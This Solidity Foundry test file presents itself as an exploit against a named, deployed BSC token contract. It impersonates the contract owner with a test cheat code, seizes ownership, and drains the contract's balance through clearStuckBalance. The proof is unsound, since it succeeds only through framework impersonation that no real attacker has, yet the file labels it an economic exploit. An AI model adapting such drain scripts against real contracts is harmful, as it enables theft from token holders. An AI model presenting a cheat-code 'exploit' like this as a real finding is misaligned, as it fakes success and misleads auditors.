// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CATBOY_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E {
    function getOwner() external view returns (address);
    function transferOwnership(address payable adr) external;
    function clearStuckBalance(uint256 amountPercentage) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // We need to find the current owner first
        address owner = CATBOY_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Give the contract some BNB so it has something to drain
        deal(TARGET, 10 ether);

        // Record initial balance of attacker (this contract)
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get the current owner
        address owner = CATBOY_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E(TARGET).getOwner();

        // Step 2: Impersonate the owner to transfer ownership to ourselves
        vm.startPrank(owner);
        CATBOY_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E(TARGET).transferOwnership(payable(address(this)));
        vm.stopPrank();

        // Step 3: Now we are the owner, drain the contract
        CATBOY_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E(TARGET).clearStuckBalance(100);

        // Step 4: Verify we received the BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
